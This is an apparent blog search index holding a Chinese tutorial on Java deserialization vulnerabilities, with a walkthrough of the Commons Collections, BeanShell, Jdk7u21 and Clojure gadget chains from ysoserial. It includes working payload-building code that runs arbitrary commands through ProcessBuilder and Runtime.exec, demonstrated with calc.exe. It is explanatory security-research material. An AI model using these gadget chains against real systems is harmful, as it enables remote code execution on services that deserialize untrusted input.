<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Java反序列化漏洞</title>
      <link href="//blog/2018/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html"/>
      <url>//blog/2018/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>Java的漏洞中，最出名的漏洞莫过于Java反序列化漏洞了。</p></blockquote><h2 id="Java的序列化和反序列化"><a href="#Java的序列化和反序列化" class="headerlink" title="Java的序列化和反序列化"></a>Java的序列化和反序列化</h2><p><strong>序列化</strong>是一个将对象转化成字节流的过程。在Java中，序列化可以通过<code>objectOutputStream</code>类的<code>writeObject</code>方法来实现。</p><p><strong>反序列化</strong>是一个将字节流恢复成对象的过程。在Java中，反序列化可以通过<code>ObjectInputStream</code>类的<code>readObject</code>方法来实现。</p><p>序列化和反序列化常常用于储存或传输对象。序列化的<code>Bytes</code>中存储的信息包括有<code>类名</code>和<code>非静态成员变量</code>，若成员变量也是对象，则会进行递归序列化和反序列化的。对于特殊的类，不能直接使用通用的序列化和反序列化方法（如HashTable），需要自定义序列化和反序列化的方法。</p><p><img src="../img/javaser/1.png" alt=""></p><h4 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h4><p>显而易见的攻击面：控制字节流<code>Bytes</code>，即可以在程序中注入恶意构造的特定对象，但是这种方法一般难以应用与构造RCE，因为程序中往往会对反序列化后的对象进行类型转换，如果非指定的类，会抛出异常；这种方法更多可能用于信息的伪造，如权限绕过。</p><p>较深层的攻击面：在反序列化的过程中，若控制字节流<code>Bytes</code>，则可控制反序列化的类以及它的成员变量，在这过程中会自动调用<code>自定义的反序列化函数</code>，则可以简化为<strong>限制特定函数的有限制的代码执行</strong>，若能执行危险函数，则存在安全风险。若能找到合适的POP链，可以导致任意代码执行或命令执行。</p><p>关于Java的反序列化漏洞可以阅读长亭科技的这篇文章</p><p><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/" target="_blank" rel="noopener">Lib之过？Java反序列化漏洞通用利用分析</a></p><p>文中重点分析了利用Apache Commons Collections实现远程代码执行的原理，大概可以理解为：</p><blockquote><p>Apache Commons Collections 3中有个<code>TransformedMap</code>类，它对标准的<code>Map</code>进行了拓展，当这个<code>TransformedMap</code>实例中的key或者value发生改变，会调用相应<code>Transformer</code>的<code>transform()</code>方法，这个相应的<code>Transformer</code>是可以通过设置属性来设置的，而且可以用多个<code>Transformer</code>组合成<code>ChainedTransformer</code>，会依次调用<code>transform()</code>方法。</p><p>Apache Commons Collections 3自带的<code>InvokerTransformer</code>类的<code>transform</code>方法里面会根据传入的参数来通过Java的反射机制来调用函数。所以，我们可以利用它来调用我们想要调用的任意函数，如<code>Runtime.getRunTime.exec</code>。</p><p>当然，这个以上所提到的需要<code>key</code>或者<code>value</code>改变，而默认的<code>readObject</code>函数并不会改变它们。所以，需要找到一个类，它的属性(成员变量)中包含有<code>Map</code>而且<code>readObject</code>函数会对<code>key</code>或者<code>value</code>进行改变，如<code>setValue</code>。</p><p>然后，找到了<code>AnnotationInvocationHandler</code>类，它恰好符合上述条件，组合即可实现，输入一个序列化后的对象，程序执行反序列化操作，调用<code>readObject</code>方法，执行恶意代码。</p></blockquote><p>听得有点迷糊吧，可以去看看上面提到的文章，跟着走一遍。</p><p>整个反序列化的流程是，<code>AnnotationInvocationHandler</code>对象，它的<code>readObject</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">  var1.defaultReadObject();</span><br><span class="line">  AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Map var3 = var2.memberTypes();</span><br><span class="line">  Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Entry var5 = (Entry)var4.next();</span><br><span class="line">    String var6 = (String)var5.getKey();</span><br><span class="line">    Class var7 = (Class)var3.get(var6);</span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">      Object var8 = var5.getValue();</span><br><span class="line">      <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实还是需要分析一下的，我们的目的需要执行<code>var5.setValue</code>，要执行到这里需要一定的条件。只要动态调试一下就可以，主要是<code>var7!=null</code>这个条件，调试一下就可以发现<code>var3</code>只有<code>value</code>这个key，所以，需要<code>Map</code>中的键值为<code>value</code>，即<code>innerMap.put(&quot;value&quot;,&quot;hello world&quot;);</code>。</p><p>OK，调用<code>setValue</code>函数，会依次调用<code>ChainedTransformer</code>里面的每一个<code>Transformer</code>的<code>transform</code>函数。这个<code>ChainedTransformer</code>的构建方法如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">((Runtime) Runtime.class.getMethod(<span class="string">"getRuntime"</span>).invoke()).exec(<span class="string">"calc.exe"</span>);</span><br><span class="line"><span class="number">1</span>.Runtime.class</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="number">2</span>.getMethod(<span class="string">"getRuntime"</span>)</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,<span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="number">3</span>.  invoke()</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line"><span class="number">4</span>. exec(<span class="string">"calc.exe"</span>)</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[] &#123;<span class="string">"calc.exe"</span>&#125;),</span><br></pre></td></tr></table></figure><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><blockquote><p>ysoserial 是一个出名的反序列化漏洞利用工具，内有大量的payload，也很方便用于增加/修改payload。</p></blockquote><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p>源码的src/main/java/ysoserial下是主程序，exploit下是针对不同应用的攻击程序，可以直接修改运行参数来使用不用的payload对目标应用进行测试，payload下是不同组件的反序列化payload，payload目录下有个util目录，里面包含有一些用于生成payload用到的小工具。</p><p>源码的src/test/java/ysooserial下是一些测试服务，可以用来测试payload。</p><p>由于<strong>JEP 290: Filter Incoming Serialization Data</strong> （JDK 9，然后反向移植到8u121, 7u131, and 6u141），在新版本的jdk下很多payload都不能用的，建议测试的时候，用低版本的jdk。</p><h3 id="BeanShell"><a href="#BeanShell" class="headerlink" title="BeanShell"></a>BeanShell</h3><blockquote><p>beanshell （bsh-2.0b5）是一个Java源代码解释器，类似于脚本语言的特性。BeanShell动态执行标准Java语法，并支持常见的脚本编写方法，如松散类型，命令和方法闭包等。BeanShell可以说是利用Java反射机制实现的新型脚本语言。/咦，貌似还挺好用。</p></blockquote><p>BeanShell的反序列化漏洞，<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2510" target="_blank" rel="noopener">CVE-2016-2510</a>，可以看到修复的commit<a href="https://github.com/beanshell/beanshell/commit/1ccc66bb693d4e46a34a904db8eeff07808d2ced#diff-d04c9f4d6d1c01bcd609c11ab2d58b2bR62" target="_blank" rel="noopener"></a>，修复方法为将<code>InvocationHandler invocationHandler=new Handler()</code>，设置为<code>transient</code>，并且禁止<code>Handler</code>类序列化。</p><p><code>BeanShell</code>通过反射的方式来实现调用函数，<code>invocationHandler</code>是我们在动态代理中很熟悉的一个参数，这里考虑到构造某类反序列化时，通过动态代理的方法调用我们事先存储在<code>invocationHandler</code>中的函数，从而执行任意代码。</p><blockquote><p><strong>小技巧</strong><br>java.util.PriorityQueue类经过构造可以调用成员变量的<code>Comparator.compare()</code>和<code>Comparator.compareTo()</code>方法。</p></blockquote><p>Payload如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> PriorityQueue <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">// BeanShell payload</span></span><br><span class="line"></span><br><span class="line">    String payload =</span><br><span class="line">        <span class="string">"compare(Object foo, Object bar) &#123;new java.lang.ProcessBuilder(new String[]&#123;"</span> +</span><br><span class="line">            Strings.join( <span class="comment">// does not support spaces in quotes</span></span><br><span class="line">                Arrays.asList(command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>,<span class="string">"\\\""</span>).split(<span class="string">" "</span>)),</span><br><span class="line">                <span class="string">","</span>, <span class="string">"\""</span>, <span class="string">"\""</span>) +</span><br><span class="line">            <span class="string">"&#125;).start();return new Integer(1);&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create Interpreter</span></span><br><span class="line">Interpreter i = <span class="keyword">new</span> Interpreter();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Evaluate payload</span></span><br><span class="line">i.eval(payload);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create InvocationHandler</span></span><br><span class="line">XThis xt = <span class="keyword">new</span> XThis(i.getNameSpace(), i);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), <span class="string">"invocationHandler"</span>).get(xt);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create Comparator Proxy</span></span><br><span class="line">Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Comparator.class&#125;, handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">Object[] queue = <span class="keyword">new</span> Object[] &#123;<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">"queue"</span>, queue);</span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">"size"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> priorityQueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，构造beanshell的执行payload，执行并存储在<code>invocationHandler</code>中，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String payload =</span><br><span class="line">        <span class="string">"compare(Object foo, Object bar) &#123;new java.lang.ProcessBuilder(new String[]&#123;"</span> +</span><br><span class="line">            Strings.join( <span class="comment">// does not support spaces in quotes</span></span><br><span class="line">                Arrays.asList(command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>,<span class="string">"\\\""</span>).split(<span class="string">" "</span>)),</span><br><span class="line">                <span class="string">","</span>, <span class="string">"\""</span>, <span class="string">"\""</span>) +</span><br><span class="line">            <span class="string">"&#125;).start();return new Integer(1);&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create Interpreter</span></span><br><span class="line">Interpreter i = <span class="keyword">new</span> Interpreter();</span><br></pre></td></tr></table></figure><p>然后，通过反射，取出<code>XThis</code>的成员变量<code>invocationHandler</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XThis xt = <span class="keyword">new</span> XThis(i.getNameSpace(), i);</span><br><span class="line">InvocationHandler handler = (InvocationHandler) Reflections.getField(xt.getClass(), <span class="string">"invocationHandler"</span>).get(xt);</span><br></pre></td></tr></table></figure><p>接下来构造动态代理，这里用到了小技巧，</p><p><code>PriorityQueue</code>类，它的readObject方法，跟进<code>heapify()</code>方法，里面调用<code>siftDown</code>方法，跟进，当<code>comparator</code>不为<code>null</code>，会调用<code>siftDownUsingComparator</code>，并在里面调用<code>comparator.compare()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in "proper order", but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDown</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (comparator != <span class="keyword">null</span>)</span><br><span class="line">    siftDownUsingComparator(k, x);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    siftDownComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，我们只要将上面获得的<code>invocationHandler</code>通过动态代理构造出实现<code>Comparator</code>的对象，并作为<code>PriorityQueue</code>的<code>comparator</code>即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create Comparator Proxy</span></span><br><span class="line">Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Comparator.class&#125;, handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Prepare Trigger Gadget (will call Comparator.compare() during deserialization)</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">Object[] queue = <span class="keyword">new</span> Object[] &#123;<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">"queue"</span>, queue);</span><br><span class="line">Reflections.setFieldValue(priorityQueue, <span class="string">"size"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> priorityQueue;</span><br></pre></td></tr></table></figure><p>回顾一下，这里我们学到了一个小技巧<code>PriorityQueue</code>可以在反序列化过程中调用<code>Comparator.compare()</code>和 <code>Comparable.compareTo()</code>函数。</p><h3 id="Jdk7u21"><a href="#Jdk7u21" class="headerlink" title="Jdk7u21"></a>Jdk7u21</h3><blockquote><p>该反序列化漏洞存在jdk自带库中，低于jdk7u21的jdk版本受此漏洞影响。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain that works against JRE 1.7u21 and earlier. Payload generation has</span><br><span class="line">the same JRE version requirements.</span><br></pre></td></tr></table></figure><blockquote><ul><li>Affected Product(s): Java SE 6, Java SE 7</li><li>Fixed in: Java SE 7u25 (2013-06-18), Java SE 8 (2014-03-18)</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">有成员变量</span><br><span class="line"><span class="keyword">byte</span>[][] _bytecodes = <span class="keyword">null</span>  <span class="comment">// 可以存储恶意bytecode</span></span><br><span class="line">存在以下调用链</span><br><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">  TemplatesImpl.newTransformer()</span><br><span class="line">    TemplatesImpl.getTransletInstance()</span><br><span class="line">      TemplatesImpl.defineTransletClasses()</span><br><span class="line">        ClassLoader.defineClass()</span><br><span class="line">只要能够调用TemplatesImpl.getOutputProperties() / TemplatesImpl.newTransformer()即可以实现任意代码执行</span><br></pre></td></tr></table></figure><p>在<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的<code>equals</code>方法会反射调用<code>Templates</code>所有方法，所以可以调用<code>getOutputProperties()</code></p><h3 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h3><blockquote><p>Clojure是一种高级的，动态的函数式编程语言。 它是基于LISP编程语言设计的，并且具有编译器，可以在Java和.Net运行时环境上运行。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.clojure:clojure</span><br><span class="line">Versions since 1.2.0 are vulnerable, although some class names may need to be changed for other versions</span><br></pre></td></tr></table></figure><blockquote><p><strong>小技巧</strong><br>java.util.HashMap类在<code>writeObject</code>过程中，将<code>key/value</code>以列表的形式逐个序列化，在<code>readObject</code>的过程中，会依次调用<code>putVal(hash(key), key, value, false, false);</code>，所以会调用的<code>key.hashCode()</code>和<code>key.equals(k)</code>函数。</p></blockquote><p>由于作者觉得之前写的文章不太容易理解，回炉重造中。。。</p><p>如果读者阅读上面文章感觉吃力，建议动手尝试，下方也提供了少量基础知识。</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Java-反射机制"><a href="#Java-反射机制" class="headerlink" title="Java 反射机制"></a>Java 反射机制</h3><p>Java反射是一个API，它被用于在<strong>运行时</strong><u>检测</u>和<u>修改</u><strong>方法</strong>、<strong>类</strong>、<strong>接口</strong>的行为。</p><p>通过反射，我们可以在运行时调用方法，而无视它们的访问说明符。</p><p>Java的反射的基础是<code>Class</code>类，当JVM加载类时会自动构造<code>Class</code>对象，而<code>Class</code>类对象则封装了（类和接口）的信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestReflection</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Object obj = Runtime.getRuntime();</span><br><span class="line">        <span class="comment">// 获取obj的类名</span></span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        <span class="comment">// 通过类名字符串获取类</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"java.lang.Runtime"</span>);</span><br><span class="line">        System.out.println(c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据名字获取方法</span></span><br><span class="line">        <span class="comment">// Runtime.getRuntime().exec("calc.exe");</span></span><br><span class="line">        Method m1 = c.getDeclaredMethod(<span class="string">"getRuntime"</span>);</span><br><span class="line">        Object o = m1.invoke(c, <span class="keyword">null</span>);</span><br><span class="line">        Method m2 = o.getClass().getMethod(<span class="string">"exec"</span>,String.class);</span><br><span class="line">        m2.invoke(o, <span class="string">"calc.exe"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Java动态代理机制"><a href="#Java动态代理机制" class="headerlink" title="Java动态代理机制"></a>Java动态代理机制</h3><p>利用Java反射技术，在运行时创建<strong>接口s</strong>的动态实现。</p><p>一般创建动态代理，用到两个关键的类<code>Proxy</code>和<code>InvocationHandler</code>。</p><blockquote><p>Proxy.newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IFoo</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">go</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">fly</span><span class="params">(<span class="keyword">int</span> len)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">IFoo</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">go</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"调用了Foo 的go函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"调用了Foo 的run函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 